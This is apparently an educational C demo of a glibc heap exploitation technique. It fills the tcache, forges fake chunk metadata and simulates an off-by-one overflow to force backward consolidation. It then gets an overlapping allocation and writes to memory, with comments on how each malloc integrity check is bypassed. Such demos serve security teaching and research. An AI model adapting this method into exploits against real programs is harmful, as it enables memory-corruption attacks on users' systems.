#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    printf("Welcome to custom heap exploitation technique!\n");
    printf("This demonstrates a novel approach to exploiting malloc/free primitives.\n");

    // Allocate 7 chunks to fill tcache later
    unsigned long *ptr[7];
    for(int i = 0; i < 7; i++) {
        ptr[i] = malloc(0x108);
        printf("Allocated chunk %d at %p\n", i, ptr[i]);
    }

    // Setup chunks for the main exploit
    printf("\nSetting up critical chunks for exploitation:\n");
    unsigned long *wrap = malloc(0x108);
    unsigned long *guard = malloc(0x40);
    unsigned long *victim = malloc(0x108);
    unsigned long *trigger = malloc(0x28);

    printf("wrap chunk at %p\n", wrap);
    printf("guard chunk at %p\n", guard);
    printf("victim chunk at %p\n", victim);
    printf("trigger chunk at %p\n", trigger);

    // Prepare fake chunk metadata in victim
    printf("\nPreparing fake chunk metadata in victim:\n");
    victim[1] = (unsigned long)0xfffffffffffffe90;  // size field
    victim[2] = (unsigned long)victim;              // fwd pointer
    victim[3] = (unsigned long)victim;              // bck pointer ; avoid : malloc_printerr ("corrupted double-linked list"); during unlink (victim = victim.bk.fd = victim.fd.bk)
    printf("victim->size = %#lx\n", victim[1]);
    printf("victim->fwd = %#lx\n", victim[2]);
    printf("victim->bck = %#lx\n", victim[3]);

    // Modify wrap chunk's metadata
    printf("\nModifying wrap chunk's metadata:\n");
    wrap[-2] = (unsigned long)0xfffffffffffffe90;   // prev_size : to consolidate with victim chunk : wrap - 0xfffffffffffffe90 = fake_chunk
    wrap[-1] = (unsigned long)0x110;                // size : Off-By-One Overflow to clear prev_inuse flag and enable consolidation
    printf("wrap->prev_size = %#lx\n", wrap[-2]);
    printf("wrap->size = %#lx\n", wrap[-1]);

    // Free chunks to fill tcache
    printf("\nFreeing chunks to fill tcache:\n");
    for(int i = 0; i < 7; i++) {
        free(ptr[i]);
        printf("Freed chunk %d at %p\n", i, ptr[i]);
    }

    // Free wrap chunk to trigger consolidation
    printf("\nFreeing wrap chunk to trigger consolidation:\n");
    free(wrap);
    printf("Freed wrap chunk at %p\n", wrap);

    // Prepare for tcache poisoning
    printf("\nPreparing for tcache poisoning:\n");
    victim[1] = (unsigned long)0x120;               // avoid malloc(): invalid size (unsorted) : fake_chunk->size > av->system_mem
    trigger[2] = (unsigned long)0x120;              // avoid malloc(): mismatching next->prev_size (unsorted) : (fake_chunk+size)->prev_size != fake_chunk->size
    trigger[3] = (unsigned long)0x120;              // avoid malloc(): invalid next size (unsorted) ; (fake_chunk+size)->size > av->system_mem
    printf("Updated victim->size = %#lx\n", victim[1]);

    // Free trigger chunk
    printf("\nFreeing trigger chunk:\n");
    free(trigger);
    printf("Freed trigger chunk at %p\n", trigger);

    // Allocate overflow chunk and demonstrate control
    printf("\nAllocating overflow chunk:\n");
    unsigned long *overflow = malloc(0x118);
    printf("Allocated overflow chunk at %p\n", overflow);

    // Write to arbitrary memory location
    printf("\nWriting to controlled memory location:\n");
    overflow[32] = (unsigned long)0x5050505050505050;
    printf("Wrote %#lx to overflow[32]\n", overflow[32]);

    printf("\nExploit completed successfully!\n");
    return 0;
}
